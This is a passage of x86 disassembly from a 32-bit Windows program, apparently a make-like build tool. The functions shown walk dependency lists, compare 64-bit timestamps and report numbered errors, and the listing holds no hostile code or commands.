  40353e:	leave  
  40353f:	ret    
  403540:	push   ebx
  403541:	push   esi
  403542:	push   edi
  403543:	push   0x8
  403545:	mov    ebx,ecx
  403547:	pop    ecx
  403548:	call   0x40a320
  40354d:	push   0x20
  40354f:	pop    ecx
  403550:	mov    edi,eax
  403552:	call   0x40a320
  403557:	mov    edx,DWORD PTR [ebx]
  403559:	mov    esi,eax
  40355b:	mov    DWORD PTR [edi+0x4],esi
  40355e:	mov    DWORD PTR [esi],edx
  403560:	mov    ecx,DWORD PTR [ebx+0x4]
  403563:	mov    DWORD PTR [esi+0x4],ecx
  403566:	mov    ecx,DWORD PTR [ebx+0x8]
  403569:	mov    DWORD PTR [esi+0x8],ecx
  40356c:	mov    ecx,DWORD PTR [ebx+0xc]
  40356f:	mov    DWORD PTR [esi+0xc],ecx
  403572:	mov    cl,BYTE PTR [ebx+0x10]
  403575:	mov    BYTE PTR [esi+0x10],cl
  403578:	mov    eax,DWORD PTR [ebx+0x18]
  40357b:	mov    DWORD PTR [esi+0x18],eax
  40357e:	mov    eax,DWORD PTR [ebx+0x1c]
  403581:	mov    DWORD PTR [esi+0x1c],eax
  403584:	mov    eax,edi
  403586:	pop    edi
  403587:	pop    esi
  403588:	pop    ebx
  403589:	ret    
  40358a:	mov    eax,0x80
  40358f:	cmp    cx,ax
  403592:	jae    0x4035a2
  403594:	movzx  eax,cx
  403597:	movzx  eax,BYTE PTR [eax+0x4010a8]
  40359e:	and    eax,0x1
  4035a1:	ret    
  4035a2:	push   ecx
  4035a3:	call   DWORD PTR ds:0x43753c
  4035a9:	neg    eax
  4035ab:	sbb    eax,eax
  4035ad:	pop    ecx
  4035ae:	inc    eax
  4035af:	ret    
  4035b0:	push   ebp
  4035b1:	mov    ebp,esp
  4035b3:	and    esp,0xfffffff8
  4035b6:	sub    esp,0x26c
  4035bc:	mov    eax,ds:0x411018
  4035c1:	xor    eax,esp
  4035c3:	mov    DWORD PTR [esp+0x268],eax
  4035ca:	push   ebx
  4035cb:	push   esi
  4035cc:	push   edi
  4035cd:	jmp    0x4036c7
  4035d2:	push   0x401088
  4035d7:	push   DWORD PTR [eax+0x4]
  4035da:	call   DWORD PTR ds:0x437544
  4035e0:	pop    ecx
  4035e1:	pop    ecx
  4035e2:	test   eax,eax
  4035e4:	je     0x403682
  4035ea:	mov    ecx,DWORD PTR ds:0x4216c0
  4035f0:	lea    eax,[esp+0x1c]
  4035f4:	mov    ecx,DWORD PTR [ecx+0x4]
  4035f7:	push   eax
  4035f8:	lea    edx,[esp+0x24]
  4035fc:	call   0x40726d
  403601:	test   eax,eax
  403603:	je     0x403669
  403605:	mov    ecx,DWORD PTR ds:0x4216c0
  40360b:	mov    edx,eax
  40360d:	mov    ecx,DWORD PTR [ecx+0x4]
  403610:	call   0x40f26d
  403615:	lea    ecx,[esp+0x20]
  403619:	mov    edi,eax
  40361b:	call   0x407253
  403620:	mov    DWORD PTR [esp+0x10],eax
  403624:	push   ecx
  403625:	lea    eax,[esp+0x14]
  403629:	mov    DWORD PTR [esp+0x18],edx
  40362d:	mov    dl,BYTE PTR ds:0x4114be
  403633:	push   eax
  403634:	mov    ecx,edi
  403636:	call   0x403700
  40363b:	push   edi
  40363c:	mov    esi,eax
  40363e:	call   DWORD PTR ds:0x43754c
  403644:	pop    ecx
  403645:	test   esi,esi
  403647:	jns    0x403656
  403649:	test   BYTE PTR ds:0x4114bc,0x8
  403650:	jne    0x4036eb
  403656:	mov    edx,DWORD PTR [esp+0x1c]
  40365a:	lea    ecx,[esp+0x20]
  40365e:	call   0x4073f5
  403663:	test   eax,eax
  403665:	jne    0x403605
  403667:	jmp    0x4036b3
  403669:	mov    eax,ds:0x4216c0
  40366e:	push   DWORD PTR [eax+0x4]
  403671:	push   0x42d
  403676:	push   0x0
  403678:	call   0x405021
  40367d:	add    esp,0xc
  403680:	jmp    0x4036b3
  403682:	mov    dl,BYTE PTR ds:0x4114be
  403688:	and    DWORD PTR [esp+0x10],0x0
  40368d:	and    DWORD PTR [esp+0x14],0x0
  403692:	push   ecx
  403693:	mov    ecx,DWORD PTR ds:0x4216c0
  403699:	lea    eax,[esp+0x14]
  40369d:	mov    ecx,DWORD PTR [ecx+0x4]
  4036a0:	push   eax
  4036a1:	call   0x403700
  4036a6:	test   eax,eax
  4036a8:	jns    0x4036b3
  4036aa:	test   BYTE PTR ds:0x4114bc,0x8
  4036b1:	jne    0x4036f0
  4036b3:	mov    eax,DWORD PTR [ebx]
  4036b5:	mov    ds:0x4216c0,eax
  4036ba:	mov    eax,ds:0x43265c
  4036bf:	mov    DWORD PTR [ebx],eax
  4036c1:	mov    DWORD PTR ds:0x43265c,ebx
  4036c7:	mov    eax,ds:0x4216c0
  4036cc:	mov    ebx,eax
  4036ce:	test   ebx,ebx
  4036d0:	jne    0x4035d2
  4036d6:	mov    ecx,DWORD PTR [esp+0x274]
  4036dd:	pop    edi
  4036de:	pop    esi
  4036df:	pop    ebx
  4036e0:	xor    ecx,esp
  4036e2:	call   0x40fd0b
  4036e7:	mov    esp,ebp
  4036e9:	pop    ebp
  4036ea:	ret    
  4036eb:	or     esi,0xffffffff
  4036ee:	jmp    0x4036f5
  4036f0:	mov    esi,0xff
  4036f5:	mov    ecx,ebx
  4036f7:	call   0x4047d9
  4036fc:	mov    eax,esi
  4036fe:	jmp    0x4036d6
  403700:	push   ebp
  403701:	mov    ebp,esp
  403703:	and    esp,0xfffffff8
  403706:	push   ecx
  403707:	and    DWORD PTR [esp],0x0
  40370b:	push   esi
  40370c:	lea    eax,[esp+0x4]
  403710:	push   eax
  403711:	push   0x0
  403713:	push   DWORD PTR [ebp+0x8]
  403716:	call   0x40373e
  40371b:	mov    ecx,DWORD PTR [esp+0x4]
  40371f:	mov    esi,eax
  403721:	test   ecx,ecx
  403723:	je     0x403735
  403725:	call   0x404a64
  40372a:	lea    ecx,[esp+0x4]
  40372e:	add    esi,eax
  403730:	call   0x404a82
  403735:	mov    eax,esi
  403737:	pop    esi
  403738:	mov    esp,ebp
  40373a:	pop    ebp
  40373b:	ret    0x8
  40373e:	push   ebp
  40373f:	mov    ebp,esp
  403741:	and    esp,0xfffffff8
  403744:	push   ecx
  403745:	push   ecx
  403746:	inc    DWORD PTR ds:0x4114b4
  40374c:	push   ebx
  40374d:	push   esi
  40374e:	push   ecx
  40374f:	push   ecx
  403750:	mov    bl,dl
  403752:	mov    esi,ecx
  403754:	mov    BYTE PTR [esp+0x14],0x1
  403759:	call   0x40de55
  40375e:	test   eax,eax
  403760:	jne    0x403770
  403762:	mov    dl,bl
  403764:	mov    ecx,esi
  403766:	call   0x40480a
  40376b:	mov    BYTE PTR [esp+0xc],0x0
  403770:	push   DWORD PTR [ebp+0x10]
  403773:	mov    dl,bl
  403775:	push   DWORD PTR [ebp+0xc]
  403778:	mov    ecx,eax
  40377a:	push   DWORD PTR [esp+0x14]
  40377e:	push   DWORD PTR [ebp+0x8]
  403781:	call   0x403796
  403786:	dec    DWORD PTR ds:0x4114b4
  40378c:	pop    esi
  40378d:	pop    ebx
  40378e:	mov    esp,ebp
  403790:	pop    ebp
  403791:	ret    0xc
  403794:	int3   
  403795:	int3   
  403796:	push   ebp
  403797:	mov    ebp,esp
  403799:	sub    esp,0x4dc
  40379f:	mov    eax,ds:0x411018
  4037a4:	xor    eax,ebp
  4037a6:	mov    DWORD PTR [ebp-0x4],eax
  4037a9:	mov    eax,DWORD PTR [ebp+0x10]
  4037ac:	and    DWORD PTR [ebp-0x464],0x0
  4037b3:	push   ebx
  4037b4:	push   esi
  4037b5:	mov    esi,DWORD PTR [ebp+0x8]
  4037b8:	push   edi
  4037b9:	mov    edi,ecx
  4037bb:	mov    DWORD PTR [ebp-0x4c8],eax
  4037c1:	mov    DWORD PTR [ebp-0x4a0],eax
  4037c7:	mov    eax,DWORD PTR [ebp+0x14]
  4037ca:	mov    BYTE PTR [ebp-0x46d],dl
  4037d0:	mov    DWORD PTR [ebp-0x4bc],esi
  4037d6:	mov    DWORD PTR [ebp-0x4dc],eax
  4037dc:	test   edi,edi
  4037de:	jne    0x4037ec
  4037e0:	and    DWORD PTR [esi],ecx
  4037e2:	and    DWORD PTR [esi+0x4],ecx
  4037e5:	xor    eax,eax
  4037e7:	jmp    0x404323
  4037ec:	test   BYTE PTR [edi+0x9],0x1
  4037f0:	je     0x40380a
  4037f2:	push   DWORD PTR [edi+0x4]
  4037f5:	push   0x42f
  4037fa:	push   0x0
  4037fc:	call   0x405021
  403801:	mov    dl,BYTE PTR [ebp-0x46d]
  403807:	add    esp,0xc
  40380a:	mov    ebx,DWORD PTR [edi+0x1c]
  40380d:	test   ebx,ebx
  40380f:	je     0x403839
  403811:	mov    ecx,DWORD PTR [ebx]
  403813:	call   0x404a64
  403818:	mov    ecx,ebx
  40381a:	mov    esi,eax
  40381c:	call   0x404a82
  403821:	mov    eax,DWORD PTR [edi+0x10]
  403824:	mov    edx,DWORD PTR [ebp-0x4bc]
  40382a:	mov    DWORD PTR [edx],eax
  40382c:	mov    eax,DWORD PTR [edi+0x14]
  40382f:	mov    DWORD PTR [edx+0x4],eax
  403832:	mov    eax,esi
  403834:	jmp    0x404323
  403839:	mov    al,BYTE PTR [edi+0x9]
  40383c:	test   al,0x2
  40383e:	je     0x4038b2
  403840:	test   dl,0x1
  403843:	je     0x40385b
  403845:	push   DWORD PTR [edi+0x14]
  403848:	mov    eax,ds:0x4114b4
  40384d:	push   DWORD PTR [edi+0x10]
  403850:	mov    edx,DWORD PTR [edi+0x4]
  403853:	lea    ecx,[eax+eax*1]
  403856:	call   0x40c542
  40385b:	mov    eax,DWORD PTR [edi+0x10]
  40385e:	mov    DWORD PTR [esi],eax
  403860:	mov    eax,DWORD PTR [edi+0x14]
  403863:	mov    DWORD PTR [esi+0x4],eax
  403866:	test   BYTE PTR ds:0x4114bc,0x8
  40386d:	jne    0x4038a3
  40386f:	cmp    DWORD PTR ds:0x4114b4,0x1
  403876:	jne    0x4038a3
  403878:	test   BYTE PTR [edi+0x9],0x4
  40387c:	jne    0x4038a3
  40387e:	mov    ecx,DWORD PTR [edi+0x4]
  403881:	lea    eax,[ebp-0x4b4]
  403887:	push   eax
  403888:	lea    edx,[ebp-0x460]
  40388e:	call   0x40726d
  403893:	test   eax,eax
  403895:	je     0x4038a3
  403897:	push   DWORD PTR [edi+0x4]
  40389a:	push   0x2
  40389c:	call   0x4050f7
  4038a1:	pop    ecx
  4038a2:	pop    ecx
  4038a3:	movzx  eax,BYTE PTR [edi+0x9]
  4038a7:	shr    eax,0x2
  4038aa:	and    eax,0x1
  4038ad:	jmp    0x404323
  4038b2:	xor    ecx,ecx
  4038b4:	or     al,0x1
  4038b6:	mov    ebx,ecx
  4038b8:	mov    esi,ecx
  4038ba:	mov    BYTE PTR [edi+0x9],al
  4038bd:	mov    eax,DWORD PTR [edi+0x18]
  4038c0:	mov    DWORD PTR [ebp-0x4a8],ecx
  4038c6:	mov    DWORD PTR [ebp-0x48c],ecx
  4038cc:	mov    DWORD PTR [ebp-0x49c],ecx
  4038d2:	mov    DWORD PTR [ebp-0x47c],ecx
  4038d8:	mov    DWORD PTR [ebp-0x474],ecx
  4038de:	mov    DWORD PTR [ebp-0x490],ecx
  4038e4:	mov    DWORD PTR [ebp-0x480],ecx
  4038ea:	mov    DWORD PTR [ebp-0x478],ecx
  4038f0:	mov    DWORD PTR [ebp-0x494],ecx
  4038f6:	mov    DWORD PTR [ebp-0x4b0],ecx
  4038fc:	mov    DWORD PTR [ebp-0x4ac],ecx
  403902:	mov    DWORD PTR [ebp-0x488],ecx
  403908:	mov    DWORD PTR [ebp-0x484],ecx
  40390e:	mov    DWORD PTR [ebp-0x4d8],ecx
  403914:	mov    DWORD PTR [ebp-0x4cc],ecx
  40391a:	mov    ecx,DWORD PTR [edi+0x4]
  40391d:	mov    DWORD PTR [ebp-0x46c],ebx
  403923:	mov    DWORD PTR [ebp-0x468],esi
  403929:	mov    DWORD PTR ds:0x421f04,ecx
  40392f:	mov    DWORD PTR ds:0x421f08,ecx
  403935:	mov    DWORD PTR [ebp-0x4c0],eax
  40393b:	test   eax,eax
  40393d:	je     0x403eb8
  403943:	mov    eax,DWORD PTR [eax+0x4]
  403946:	test   BYTE PTR [eax+0x10],0x20
  40394a:	je     0x40397d
  40394c:	lea    eax,[ebp-0x4b4]
  403952:	push   eax
  403953:	lea    edx,[ebp-0x460]
  403959:	call   0x40726d
  40395e:	test   eax,eax
  403960:	je     0x40397d
  403962:	lea    ecx,[ebp-0x460]
  403968:	call   0x407253
  40396d:	mov    ebx,eax
  40396f:	mov    DWORD PTR [ebp-0x46c],eax
  403975:	mov    esi,edx
  403977:	mov    DWORD PTR [ebp-0x468],edx
  40397d:	mov    eax,DWORD PTR [ebp-0x4c0]
  403983:	mov    ecx,DWORD PTR [eax+0x4]
  403986:	and    DWORD PTR [ebp-0x498],0x0
  40398d:	and    DWORD PTR [ebp-0x4a4],0x0
  403994:	lea    edx,[ecx+0x18]
  403997:	mov    DWORD PTR [ebp-0x480],ecx
  40399d:	mov    eax,DWORD PTR [edx]
  40399f:	or     eax,DWORD PTR [edx+0x4]
  4039a2:	mov    DWORD PTR [ebp-0x4c4],edx
  4039a8:	je     0x4039d3
  4039aa:	cmp    esi,DWORD PTR [edx+0x4]
  4039ad:	ja     0x403ea2
  4039b3:	jb     0x4039bd
  4039b5:	cmp    ebx,DWORD PTR [edx]
  4039b7:	ja     0x403ea2
  4039bd:	mov    ebx,DWORD PTR [edx]
  4039bf:	mov    esi,DWORD PTR [edx+0x4]
  4039c2:	mov    DWORD PTR [ebp-0x46c],ebx
  4039c8:	mov    DWORD PTR [ebp-0x468],esi
  4039ce:	jmp    0x403ea2
  4039d3:	mov    DWORD PTR [ebp-0x4d8],edx
  4039d9:	mov    edx,DWORD PTR [edi+0x4]
  4039dc:	call   0x404334
  4039e1:	mov    ebx,eax
  4039e3:	mov    DWORD PTR [ebp-0x4b8],ebx
  4039e9:	test   ebx,ebx
  4039eb:	je     0x403b9a
  4039f1:	mov    eax,DWORD PTR [ebx+0x8]
  4039f4:	mov    DWORD PTR [ebp-0x4b0],eax
  4039fa:	mov    eax,DWORD PTR [ebx+0xc]
  4039fd:	mov    DWORD PTR [ebp-0x4ac],eax
  403a03:	mov    ecx,DWORD PTR [ebx+0x4]
  403a06:	lea    eax,[ebp-0x4cc]
  403a0c:	push   eax
  403a0d:	push   0x0
  403a0f:	lea    eax,[ebp-0x4b0]
  403a15:	push   eax
  403a16:	mov    eax,DWORD PTR [ebp-0x480]
  403a1c:	mov    dl,BYTE PTR [eax+0x10]
  403a1f:	call   0x40373e
  403a24:	add    DWORD PTR [ebp-0x464],eax
  403a2a:	cmp    BYTE PTR ds:0x4216e7,0x0
  403a31:	je     0x403a64
  403a33:	test   eax,eax
  403a35:	je     0x403a64
  403a37:	push   ecx
  403a38:	push   ecx
  403a39:	mov    ecx,DWORD PTR [ebx+0x4]
  403a3c:	call   0x40de55
  403a41:	test   BYTE PTR [eax+0x9],0x8
  403a45:	jne    0x403a60
  403a47:	push   DWORD PTR [ebx+0x4]
  403a4a:	mov    BYTE PTR ds:0x411020,0x0
  403a51:	push   0xfaa
  403a56:	push   0x0
  403a58:	call   0x405021
  403a5d:	add    esp,0xc
  403a60:	or     BYTE PTR [edi+0x9],0x8
  403a64:	mov    edx,DWORD PTR [ebp-0x4ac]
  403a6a:	mov    ecx,DWORD PTR [ebp-0x4b0]
  403a70:	cmp    DWORD PTR [ebp-0x4a4],edx
  403a76:	ja     0x403a8e
  403a78:	jb     0x403a82
  403a7a:	cmp    DWORD PTR [ebp-0x498],ecx
  403a80:	ja     0x403a8e
  403a82:	mov    DWORD PTR [ebp-0x498],ecx
  403a88:	mov    DWORD PTR [ebp-0x4a4],edx
  403a8e:	mov    eax,DWORD PTR [ebp-0x46c]
  403a94:	or     eax,esi
  403a96:	jne    0x403af6
  403a98:	mov    eax,DWORD PTR [ebp-0x480]
  403a9e:	test   BYTE PTR [eax+0x10],0x20
  403aa2:	jne    0x403af6
  403aa4:	mov    ecx,DWORD PTR [edi+0x4]
  403aa7:	lea    eax,[ebp-0x4b4]
  403aad:	push   eax
  403aae:	lea    edx,[ebp-0x460]
  403ab4:	call   0x40726d
  403ab9:	test   eax,eax
  403abb:	je     0x403aea
  403abd:	lea    ecx,[ebp-0x460]
  403ac3:	call   0x407253
  403ac8:	mov    ecx,DWORD PTR [ebp-0x4b0]
  403ace:	mov    esi,edx
  403ad0:	mov    edx,DWORD PTR [ebp-0x4ac]
  403ad6:	mov    DWORD PTR [ebp-0x46c],eax
  403adc:	mov    DWORD PTR [ebp-0x468],esi
  403ae2:	mov    DWORD PTR [edi+0x10],eax
  403ae5:	mov    DWORD PTR [edi+0x14],esi
  403ae8:	jmp    0x403afc
  403aea:	mov    edx,DWORD PTR [ebp-0x4ac]
  403af0:	mov    ecx,DWORD PTR [ebp-0x4b0]
  403af6:	mov    eax,DWORD PTR [ebp-0x46c]
  403afc:	test   BYTE PTR [edi+0x8],0x10
  403b00:	jne    0x403b1d
  403b02:	cmp    esi,edx
  403b04:	jb     0x403b1d
  403b06:	ja     0x403b0c
  403b08:	cmp    eax,ecx
  403b0a:	jb     0x403b1d
  403b0c:	cmp    BYTE PTR ds:0x4216e6,0x0
  403b13:	je     0x403b53
  403b15:	cmp    eax,ecx
  403b17:	jne    0x403b53
  403b19:	cmp    esi,edx
  403b1b:	jne    0x403b53
  403b1d:	call   0x40dcc8
  403b22:	mov    ecx,DWORD PTR [ebx+0x4]
  403b25:	mov    esi,eax
  403b27:	call   0x40dd18
  403b2c:	mov    ecx,DWORD PTR [ebp-0x4a8]
  403b32:	mov    DWORD PTR [esi+0x4],eax
  403b35:	lea    eax,[ebp-0x48c]
  403b3b:	jmp    0x403b41
  403b3d:	mov    eax,ecx
  403b3f:	mov    ecx,DWORD PTR [eax]
  403b41:	test   ecx,ecx
  403b43:	jne    0x403b3d
  403b45:	mov    DWORD PTR [eax],esi
  403b47:	mov    eax,DWORD PTR [ebp-0x48c]
  403b4d:	mov    DWORD PTR [ebp-0x4a8],eax
  403b53:	call   0x40dcc8
  403b58:	mov    ecx,DWORD PTR [ebx+0x4]
  403b5b:	mov    esi,eax
  403b5d:	call   0x40dd18
  403b62:	mov    ecx,DWORD PTR [ebp-0x49c]
  403b68:	mov    DWORD PTR [esi+0x4],eax
  403b6b:	lea    eax,[ebp-0x47c]
  403b71:	jmp    0x403b77
  403b73:	mov    eax,ecx
  403b75:	mov    ecx,DWORD PTR [eax]
  403b77:	test   ecx,ecx
  403b79:	jne    0x403b73
  403b7b:	mov    DWORD PTR [eax],esi
  403b7d:	mov    ebx,DWORD PTR [ebx]
  403b7f:	mov    eax,DWORD PTR [ebp-0x47c]
  403b85:	mov    DWORD PTR [ebp-0x49c],eax
  403b8b:	test   ebx,ebx
  403b8d:	je     0x403b9a
  403b8f:	mov    esi,DWORD PTR [ebp-0x468]
  403b95:	jmp    0x4039f1
  403b9a:	mov    ecx,DWORD PTR [ebp-0x4cc]
  403ba0:	test   ecx,ecx
  403ba2:	je     0x403bba
  403ba4:	call   0x404a64
  403ba9:	add    DWORD PTR [ebp-0x464],eax
  403baf:	lea    ecx,[ebp-0x4cc]
  403bb5:	call   0x404a82
  403bba:	mov    ebx,DWORD PTR [ebp-0x4b8]
  403bc0:	jmp    0x403bd6
  403bc2:	push   DWORD PTR [ebx+0x4]
  403bc5:	call   DWORD PTR ds:0x43754c
  403bcb:	mov    ebx,DWORD PTR [ebx]
  403bcd:	pop    ecx
  403bce:	push   esi
  403bcf:	call   DWORD PTR ds:0x43754c
  403bd5:	pop    ecx
  403bd6:	mov    esi,ebx
  403bd8:	test   ebx,ebx
  403bda:	jne    0x403bc2
  403bdc:	mov    edx,DWORD PTR [ebp-0x480]
  403be2:	mov    al,BYTE PTR [edx+0x10]
  403be5:	mov    DWORD PTR [ebp-0x4b8],eax
  403beb:	test   al,0x20
  403bed:	je     0x403e26
  403bf3:	mov    edx,DWORD PTR [edx+0x8]
  403bf6:	test   edx,edx
  403bf8:	je     0x403e79
  403bfe:	mov    ecx,DWORD PTR [ebp-0x4a8]
  403c04:	mov    esi,DWORD PTR [edi+0x4]
  403c07:	and    DWORD PTR ds:0x421ef8,0x0
  403c0e:	and    DWORD PTR ds:0x421efc,0x0
  403c15:	mov    DWORD PTR ds:0x421f00,ecx
  403c1b:	mov    ecx,DWORD PTR [ebp-0x49c]
  403c21:	mov    DWORD PTR ds:0x421ef4,ecx
  403c27:	mov    cl,BYTE PTR ds:0x4216e7
  403c2d:	mov    DWORD PTR ds:0x421f04,esi
  403c33:	mov    DWORD PTR ds:0x421f08,esi
  403c39:	test   cl,cl
  403c3b:	je     0x403c43
  403c3d:	test   BYTE PTR [edi+0x9],0x8
  403c41:	je     0x403c4c
  403c43:	cmp    DWORD PTR [ebp-0x464],0x0
  403c4a:	jne    0x403c6f
  403c4c:	mov    ebx,DWORD PTR [ebp-0x468]
  403c52:	cmp    ebx,DWORD PTR [ebp-0x4a4]
  403c58:	jb     0x403cc4
  403c5a:	ja     0x403c75
  403c5c:	mov    esi,DWORD PTR [ebp-0x498]
  403c62:	cmp    DWORD PTR [ebp-0x46c],esi
  403c68:	mov    esi,DWORD PTR [edi+0x4]
  403c6b:	jb     0x403cc4
  403c6d:	jmp    0x403c75
  403c6f:	mov    ebx,DWORD PTR [ebp-0x468]
  403c75:	cmp    BYTE PTR ds:0x4216e6,0x0
  403c7c:	je     0x403c97
  403c7e:	mov    esi,DWORD PTR [ebp-0x498]
  403c84:	cmp    DWORD PTR [ebp-0x46c],esi
  403c8a:	mov    esi,DWORD PTR [edi+0x4]
  403c8d:	jne    0x403c97
  403c8f:	cmp    ebx,DWORD PTR [ebp-0x4a4]
  403c95:	je     0x403cc4
  403c97:	mov    eax,DWORD PTR [ebp-0x46c]
  403c9d:	or     eax,ebx
  403c9f:	jne    0x403caf
  403ca1:	mov    eax,DWORD PTR [ebp-0x498]
  403ca7:	or     eax,DWORD PTR [ebp-0x4a4]
  403cad:	je     0x403cbe
  403caf:	mov    eax,DWORD PTR [ebp-0x480]
  403cb5:	cmp    DWORD PTR [eax],0x0
  403cb8:	jne    0x403dd6
  403cbe:	mov    eax,DWORD PTR [ebp-0x4b8]
  403cc4:	mov    ecx,DWORD PTR [ebp-0x4c8]
  403cca:	mov    bl,BYTE PTR ds:0x432632
  403cd0:	mov    BYTE PTR ds:0x432632,0x1
  403cd7:	test   ecx,ecx
  403cd9:	jne    0x403cf8
  403cdb:	mov    ecx,DWORD PTR [ebp-0x49c]
  403ce1:	test   ecx,ecx
  403ce3:	je     0x403cea
  403ce5:	mov    ecx,DWORD PTR [ecx+0x4]
  403ce8:	jmp    0x403cec
  403cea:	xor    ecx,ecx
  403cec:	mov    DWORD PTR [ebp-0x4a0],ecx
  403cf2:	mov    DWORD PTR [ebp-0x4c8],ecx
  403cf8:	push   ecx
  403cf9:	push   eax
  403cfa:	mov    eax,DWORD PTR [ebp-0x480]
  403d00:	mov    ecx,esi
  403d02:	push   DWORD PTR [eax+0xc]
  403d05:	call   0x40532b
  403d0a:	add    DWORD PTR [ebp-0x464],eax
  403d10:	test   BYTE PTR [edi+0x8],0x4
  403d14:	jne    0x403d3e
  403d16:	mov    ecx,DWORD PTR [edi+0x4]
  403d19:	lea    eax,[ebp-0x4b4]
  403d1f:	push   eax
  403d20:	lea    edx,[ebp-0x460]
  403d26:	call   0x40726d
  403d2b:	test   eax,eax
  403d2d:	je     0x403d3e
  403d2f:	lea    ecx,[ebp-0x460]
  403d35:	call   0x407253
  403d3a:	mov    ecx,edx
  403d3c:	jmp    0x403d7b
  403d3e:	mov    ecx,DWORD PTR [ebp-0x488]
  403d44:	mov    edx,DWORD PTR [ebp-0x484]
  403d4a:	mov    eax,ecx
  403d4c:	or     eax,edx
  403d4e:	je     0x403d62
  403d50:	mov    eax,ecx
  403d52:	mov    DWORD PTR [ebp-0x478],ecx
  403d58:	mov    ecx,edx
  403d5a:	mov    DWORD PTR [ebp-0x494],edx
  403d60:	jmp    0x403d87
  403d62:	lea    eax,[ebp-0x4d4]
  403d68:	push   eax
  403d69:	call   DWORD PTR ds:0x437308
  403d6f:	mov    eax,DWORD PTR [ebp-0x4d4]
  403d75:	mov    ecx,DWORD PTR [ebp-0x4d0]
  403d7b:	mov    DWORD PTR [ebp-0x494],ecx
  403d81:	mov    DWORD PTR [ebp-0x478],eax
  403d87:	mov    edx,DWORD PTR [ebp-0x4c4]
  403d8d:	mov    esi,DWORD PTR [ebp-0x4a8]
  403d93:	mov    DWORD PTR [edx],eax
  403d95:	mov    eax,DWORD PTR [ebp-0x49c]
  403d9b:	mov    DWORD PTR [edx+0x4],ecx
  403d9e:	mov    ecx,eax
  403da0:	cmp    eax,esi
  403da2:	je     0x403dab
  403da4:	call   0x4047d9
  403da9:	mov    ecx,esi
  403dab:	call   0x4047d9
  403db0:	mov    cl,BYTE PTR ds:0x4216e7
  403db6:	xor    eax,eax
  403db8:	mov    DWORD PTR [ebp-0x4a8],eax
  403dbe:	mov    DWORD PTR [ebp-0x48c],eax
  403dc4:	mov    DWORD PTR [ebp-0x49c],eax
  403dca:	mov    DWORD PTR [ebp-0x47c],eax
  403dd0:	mov    BYTE PTR ds:0x432632,bl
  403dd6:	test   cl,cl
  403dd8:	je     0x403e79
  403dde:	test   BYTE PTR [edi+0x9],0x8
  403de2:	je     0x403dfa
  403de4:	push   DWORD PTR [edi+0x4]
  403de7:	push   0xfab
  403dec:	push   0x0
  403dee:	call   0x405021
  403df3:	add    esp,0xc
  403df6:	and    BYTE PTR [edi+0x9],0xf7
  403dfa:	mov    ebx,DWORD PTR [ebp-0x464]
  403e00:	test   ebx,ebx
  403e02:	je     0x403e7f
  403e04:	push   DWORD PTR [edi+0x4]
  403e07:	xor    ebx,ebx
  403e09:	push   0xfaa
  403e0e:	push   ebx
  403e0f:	mov    BYTE PTR ds:0x411020,0x0
  403e16:	mov    DWORD PTR [ebp-0x464],ebx
  403e1c:	call   0x405021
  403e21:	add    esp,0xc
  403e24:	jmp    0x403e7f
  403e26:	cmp    DWORD PTR [edx+0x8],0x0
  403e2a:	je     0x403e4f
  403e2c:	cmp    DWORD PTR [ebp-0x490],0x0
  403e33:	je     0x403e49
  403e35:	push   DWORD PTR [edi+0x4]
  403e38:	push   0xfa4
  403e3d:	push   0x0
  403e3f:	call   0x405021
  403e44:	add    esp,0xc
  403e47:	jmp    0x403e4f
  403e49:	mov    DWORD PTR [ebp-0x490],edx
  403e4f:	mov    ecx,DWORD PTR [ebp-0x4a4]
  403e55:	cmp    DWORD PTR [ebp-0x484],ecx
  403e5b:	ja     0x403e79
  403e5d:	mov    eax,DWORD PTR [ebp-0x498]
  403e63:	jb     0x403e6d
  403e65:	cmp    DWORD PTR [ebp-0x488],eax
  403e6b:	ja     0x403e79
  403e6d:	mov    DWORD PTR [ebp-0x488],eax
  403e73:	mov    DWORD PTR [ebp-0x484],ecx
  403e79:	mov    ebx,DWORD PTR [ebp-0x464]
  403e7f:	mov    eax,DWORD PTR [ebp-0x480]
  403e85:	test   BYTE PTR [eax+0x10],0x20
  403e89:	je     0x403e96
  403e8b:	mov    esi,DWORD PTR [ebp-0x4c0]
  403e91:	cmp    DWORD PTR [esi],0x0
  403e94:	je     0x403eee
  403e96:	mov    ebx,DWORD PTR [ebp-0x46c]
  403e9c:	mov    esi,DWORD PTR [ebp-0x468]
  403ea2:	mov    eax,DWORD PTR [ebp-0x4c0]
  403ea8:	mov    eax,DWORD PTR [eax]
  403eaa:	mov    DWORD PTR [ebp-0x4c0],eax
  403eb0:	test   eax,eax
  403eb2:	jne    0x403983
  403eb8:	mov    edx,DWORD PTR [ebp-0x4bc]
  403ebe:	and    DWORD PTR ds:0x421ef8,0x0
  403ec5:	mov    esi,DWORD PTR [edx]
  403ec7:	mov    ebx,DWORD PTR [edx+0x4]
  403eca:	and    DWORD PTR ds:0x421efc,0x0
  403ed1:	mov    eax,esi
  403ed3:	or     eax,ebx
  403ed5:	jne    0x403f75
  403edb:	mov    eax,DWORD PTR [edi+0x10]
  403ede:	or     eax,DWORD PTR [edi+0x14]
  403ee1:	je     0x403f4d
  403ee3:	mov    esi,DWORD PTR [edi+0x10]
  403ee6:	mov    ebx,DWORD PTR [edi+0x14]
  403ee9:	jmp    0x403f75
  403eee:	mov    al,BYTE PTR [edi+0x9]
  403ef1:	and    al,0xfe
  403ef3:	or     al,0x2
  403ef5:	mov    BYTE PTR [edi+0x9],al
  403ef8:	test   ebx,ebx
  403efa:	jle    0x403f00
  403efc:	or     al,0x4
  403efe:	jmp    0x403f02
  403f00:	and    al,0xfb
  403f02:	mov    esi,DWORD PTR [ebp-0x494]
  403f08:	mov    BYTE PTR [edi+0x9],al
  403f0b:	mov    eax,DWORD PTR [ebp-0x468]
  403f11:	cmp    esi,eax
  403f13:	jb     0x403f2f
  403f15:	mov    edx,DWORD PTR [ebp-0x478]
  403f1b:	ja     0x403f27
  403f1d:	mov    ecx,DWORD PTR [ebp-0x46c]
  403f23:	cmp    edx,ecx
  403f25:	jbe    0x403f35
  403f27:	mov    DWORD PTR [ebp-0x46c],edx
  403f2d:	mov    eax,esi
  403f2f:	mov    ecx,DWORD PTR [ebp-0x46c]
  403f35:	mov    edx,DWORD PTR [ebp-0x4bc]
  403f3b:	mov    DWORD PTR [edi+0x14],eax
  403f3e:	mov    DWORD PTR [edi+0x10],ecx
  403f41:	mov    DWORD PTR [edx+0x4],eax
  403f44:	mov    DWORD PTR [edx],ecx
  403f46:	mov    eax,ebx
  403f48:	jmp    0x404323
  403f4d:	mov    ecx,DWORD PTR [edi+0x4]
